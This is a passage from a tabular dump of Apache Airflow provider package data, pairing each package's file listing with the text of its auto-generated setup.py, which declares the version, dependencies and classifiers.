        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-backport-providers-snowflake-2021.3.13,0,1,1,1,1,0,0,0,examp __ini snowflake.py __init__.py snowflak __init__ s3_to_sn snowflak __init__ __init__.py CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-snowflake package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.13'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-snowflake setup.""""""
    setup(
        name='apache-airflow-backport-providers-snowflake',
        description='Backport provider package '
        'apache-airflow-backport-providers-snowflake for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(
            include=['airflow.providers.snowflake', 'airflow.providers.snowflake.*']
        ),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow~=1.10',
            'snowflake-connector-python>=2.4.1',
            'snowflake-sqlalchemy>=1.1.0',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={'slack': ['apache-airflow-backport-providers-slack']},
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-backport-providers-ssh-2021.3.3,0,1,1,1,1,0,0,0,ssh.py __init__.py ssh.py __init__.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGELOG.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-backport-providers-ssh package.""""""

import logging
import os

from os.path import dirname
from setuptools import find_namespace_packages, setup

logger = logging.getLogger(__name__)

version = '2021.3.3'

my_dir = dirname(__file__)

try:
    with open(os.path.join(my_dir, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()
except FileNotFoundError:
    long_description = ''


def do_setup():
    """"""Perform the package apache-airflow-backport-providers-ssh setup.""""""
    setup(
        name='apache-airflow-backport-providers-ssh',
        description='Backport provider package ' 'apache-airflow-backport-providers-ssh for Apache Airflow',
        long_description=long_description,
        long_description_content_type='text/markdown',
        license='Apache License 2.0',
        version=version,
        packages=find_namespace_packages(include=['airflow.providers.ssh', 'airflow.providers.ssh.*']),
        zip_safe=False,
        include_package_data=True,
        install_requires=[
            'apache-airflow~=1.10',
            'paramiko>=2.6.0',
            'pysftp>=0.2.9',
            'sshtunnel>=0.1.4,<0.2',
        ],
        setup_requires=['setuptools', 'wheel'],
        extras_require={},
        classifiers=[
            'Development Status :: 5 - Production/Stable',
            'Environment :: Console',
            'Environment :: Web Environment',
            'Intended Audience :: Developers',
            'Intended Audience :: System Administrators',
            'License :: OSI Approved :: Apache Software License',
            'Programming Language :: Python :: 3.6',
            'Programming Language :: Python :: 3.7',
            'Programming Language :: Python :: 3.8',
            'Topic :: System :: Monitoring',
        ],
        author='Apache Software Foundation',
        author_email='dev@airflow.apache.org',
        url='https://airflow.apache.org/',
        download_url='https://archive.apache.org/dist/airflow/backport-providers',
        python_requires='~=3.6',
        project_urls={
            'Documentation': 'https://airflow.apache.org/docs/',
            'Bug Tracker': 'https://github.com/apache/airflow/issues',
            'Source Code': 'https://github.com/apache/airflow',
        },
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-airbyte-3.1.0,0,1,1,1,1,0,0,0,example_airbyte_trigger_job.py __init__.py get_provider_info.py airbyte.py __init__.py airbyte.py __init__.py airbyte.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-airbyte package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-airbyte setup.""""""
    setup(
        version=version,
        extras_require={'http': ['apache-airflow-providers-http']},
        packages=find_namespace_packages(
            include=['airflow.providers.airbyte', 'airflow.providers.airbyte.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-amazon-4.1.0,1,1,1,1,1,0,0,0,example_appflow.py example_batch.py example_datasync.py example_dms.py example_dynamodb_to_s3.py example_ec2.py example_ecs.py example_ecs_fargate.py example_eks_templated.py example_eks_with_fargate_in_one_step.py example_eks_with_fargate_profile.py example_eks_with_nodegroups.py example_eks_with_nodegroup_in_one_step.py example_emr.py example_emr_eks.py example_ftp_to_s3.py example_gcs_to_s3.py example_glacier_to_gcs.py example_glue.py example_google_api_sheets_to_s3.py example_google_api_youtube_to_s3.py example_hive_to_dynamodb.py example_imap_attachment_to_s3.py example_lambda.py example_local_to_s3.py example_mongo_to_s3.py example_quicksight.py example_rds_export.py example_redshift_cluster.py example_redshift_data_execute_sql.py example_redshift_sql.py example_redshift_to_s3.py example_s3.py example_s3_to_ftp.py example_s3_to_redshift.py example_s3_to_sftp.py example_sagemaker.py example_sagemaker_endpoint.py example_salesforce_to_s3.py example_sftp_to_s3.py example_sql_to_s3.py __init__.py exceptions.py appflow.py athena.py aws_dynamodb.py base_aws.py batch_client.py batch_waiters.json batch_waiters.py cloud_formation.py datasync.py dms.py dynamodb.py ec2.py eks.py elasticache_replication_group.py emr.py emr_containers.py glacier.py glue.py glue_catalog.py glue_crawler.py kinesis.py lambda_function.py logs.py quicksight.py rds.py redshift.py redshift_cluster.py redshift_data.py redshift_sql.py s3.py sagemaker.py secrets_manager.py ses.py sns.py sqs.py step_function.py sts.py __init__.py base_aws.py batch.py emr.py logs.py __init__.py cloudwatch_task_handler.py s3_task_handler.py __init__.py appflow.py athena.py aws_lambda.py batch.py cloud_formation.py datasync.py dms.py dms_create_task.py dms_delete_task.py dms_describe_tasks.py dms_start_task.py dms_stop_task.py ec2.py ec2_start_instance.py ec2_stop_instance.py ecs.py eks.py emr.py emr_add_steps.py emr_containers.py emr_create_job_flow.py emr_modify_cluster.py emr_terminate_job_flow.py glacier.py glue.py glue_crawler.py quicksight.py rds.py redshift.py redshift_cluster.py redshift_data.py redshift_sql.py s3.py s3_bucket.py s3_bucket_tagging.py s3_copy_object.py s3_delete_objects.py s3_file_transform.py s3_list.py s3_list_prefixes.py sagemaker.py sagemaker_base.py sagemaker_endpoint.py sagemaker_endpoint_config.py sagemaker_model.py sagemaker_processing.py sagemaker_training.py sagemaker_transform.py sagemaker_tuning.py sns.py sqs.py step_function.py step_function_get_execution_output.py step_function_start_execution.py __init__.py secrets_manager.py systems_manager.py __init__.py athena.py batch.py cloud_formation.py dms.py dms_task.py ec2.py ec2_instance_state.py eks.py emr.py emr_base.py emr_containers.py emr_job_flow.py emr_step.py glacier.py glue.py glue_catalog_partition.py glue_crawler.py quicksight.py rds.py redshift.py redshift_cluster.py s3.py s3_key.py s3_keys_unchanged.py s3_prefix.py sagemaker.py sagemaker_base.py sagemaker_endpoint.py sagemaker_training.py sagemaker_transform.py sagemaker_tuning.py sqs.py step_function.py step_function_execution.py __init__.py dynamodb_to_s3.py exasol_to_s3.py ftp_to_s3.py gcs_to_s3.py glacier_to_gcs.py google_api_to_s3.py hive_to_dynamodb.py imap_attachment_to_s3.py local_to_s3.py mongo_to_s3.py mysql_to_s3.py redshift_to_s3.py s3_to_ftp.py s3_to_redshift.py s3_to_sftp.py salesforce_to_s3.py sftp_to_s3.py sql_to_s3.py __init__.py eks_get_token.py emailer.py rds.py redshift.py __init__.py __init__.py get_provider_info.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-amazon package.""""""

from setuptools import find_namespace_packages, setup

version = '4.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-amazon setup.""""""
    setup(
        version=version,
        extras_require={
            'apache.hive': ['apache-airflow-providers-apache-hive'],
            'cncf.kubernetes': ['apache-airflow-providers-cncf-kubernetes'],
            'common.sql': ['apache-airflow-providers-common-sql'],
            'exasol': ['apache-airflow-providers-exasol'],
            'ftp': ['apache-airflow-providers-ftp'],
            'google': ['apache-airflow-providers-google'],
            'imap': ['apache-airflow-providers-imap'],
            'mongo': ['apache-airflow-providers-mongo'],
            'salesforce': ['apache-airflow-providers-salesforce'],
            'ssh': ['apache-airflow-providers-ssh'],
        },
        packages=find_namespace_packages(include=['airflow.providers.amazon', 'airflow.providers.amazon.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-apache-hdfs-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py hdfs.py webhdfs.py __init__.py hdfs.py web_hdfs.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-apache-hdfs package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-apache-hdfs setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.apache.hdfs', 'airflow.providers.apache.hdfs.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-apache-hive-4.0.0,0,1,1,1,1,0,0,0,get_provider_info.py hive.py __init__.py hive.py hive_stats.py __init__.py hive_partition.py metastore_partition.py named_hive_partition.py __init__.py hive_to_mysql.py hive_to_samba.py mssql_to_hive.py mysql_to_hive.py s3_to_hive.py vertica_to_hive.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-apache-hive package.""""""

from setuptools import find_namespace_packages, setup

version = '4.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-apache-hive setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon'],
            'common.sql': ['apache-airflow-providers-common-sql'],
            'microsoft.mssql': ['apache-airflow-providers-microsoft-mssql'],
            'mysql': ['apache-airflow-providers-mysql'],
            'presto': ['apache-airflow-providers-presto'],
            'samba': ['apache-airflow-providers-samba'],
            'vertica': ['apache-airflow-providers-vertica'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.apache.hive', 'airflow.providers.apache.hive.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-apache-livy-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py livy.py __init__.py livy.py __init__.py livy.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-apache-livy package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-apache-livy setup.""""""
    setup(
        version=version,
        extras_require={'http': ['apache-airflow-providers-http']},
        packages=find_namespace_packages(
            include=['airflow.providers.apache.livy', 'airflow.providers.apache.livy.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-apache-spark-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py spark_jdbc.py spark_jdbc_script.py spark_sql.py spark_submit.py __init__.py spark_jdbc.py spark_sql.py spark_submit.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-apache-spark package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-apache-spark setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.apache.spark', 'airflow.providers.apache.spark.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-celery-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py celery_queue.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-celery package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-celery setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.celery', 'airflow.providers.celery.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-cncf-kubernetes-4.2.0,0,1,1,1,1,0,0,0,backwards_compat_converters.py pod.py pod_runtime_info_env.py volume.py volume_mount.py __init__.py get_provider_info.py kubernetes.py __init__.py kubernetes_pod.py spark_kubernetes.py __init__.py spark_kubernetes.py __init__.py pod_manager.py xcom_sidecar.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-cncf-kubernetes package.""""""

from setuptools import find_namespace_packages, setup

version = '4.2.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-cncf-kubernetes setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.cncf.kubernetes', 'airflow.providers.cncf.kubernetes.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-common-sql-1.0.0,0,1,1,1,1,0,0,0,get_provider_info.py sql.py __init__.py sql.py __init__.py sql.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-common-sql package.""""""

from setuptools import find_namespace_packages, setup

version = '1.0.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-common-sql setup.""""""
    setup(
        version=version,
        extras_require={'pandas': ['pandas>=0.17.1']},
        packages=find_namespace_packages(
            include=['airflow.providers.common.sql', 'airflow.providers.common.sql.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-databricks-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py databricks.py databricks_base.py databricks_sql.py __init__.py databricks.py databricks_repos.py databricks_sql.py __init__.py databricks.py __init__.py databricks.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-databricks package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-databricks setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(
            include=['airflow.providers.databricks', 'airflow.providers.databricks.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-datadog-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py datadog.py __init__.py datadog.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-datadog package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-datadog setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.datadog', 'airflow.providers.datadog.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-dbt-cloud-2.1.0,0,1,1,1,1,0,0,0,get_provider_info.py dbt.py __init__.py dbt.py __init__.py dbt.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
